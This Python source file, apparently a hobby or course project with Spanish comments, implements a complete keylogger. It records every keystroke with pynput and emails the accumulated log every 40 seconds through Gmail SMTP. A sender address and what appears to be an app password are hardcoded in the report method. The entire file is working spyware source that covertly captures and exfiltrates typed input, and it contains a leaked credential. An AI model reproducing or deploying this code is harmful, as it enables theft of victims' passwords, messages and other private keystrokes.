#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer =  None
        self.is_first_run = True

    def pressed_key(self, key):
    
        try:
            self.log += str(key.char)
    
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter", key.shift: " Shift ", key.shift_r: " Shift ", key.alt: " Alt ", key.ctrl: " Ctrl "}

            self.log += special_keys.get(key, f"{str(key)}")


        #### Metodo guarro  ###
        #if key == key.space:
        #   log+= " "
        #elif key == key.backspace:
        #    log += " Backspace "
        #elif key == key.enter:
        #    log += " Enter "
        #elif key == key.shift_r or key ==key.shift:
        #    log += " Shift "
        #elif key == key.alt:
        #    log += "Alt "
        #elif key==key.ctrl:
        #    log += " Ctrl "
        #else:
        #    log += " " + str(key) + " "

        # print(self.log)

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(f"\n[+] Email sent successfully!\n")

    def report(self):
        email_body = "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "santi.lpz28@gmail.com", ["santi.lpz28@gmail.com"], "awoa xcse lpvj vksj")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False
    
        if not self.request_shutdown:

            self.timer = threading.Timer(40, self.report) #indicamos cada cuando llamamos la funcion. Tambien aplicamos recursividad
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) #Estamos indicando el keyboard listener

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

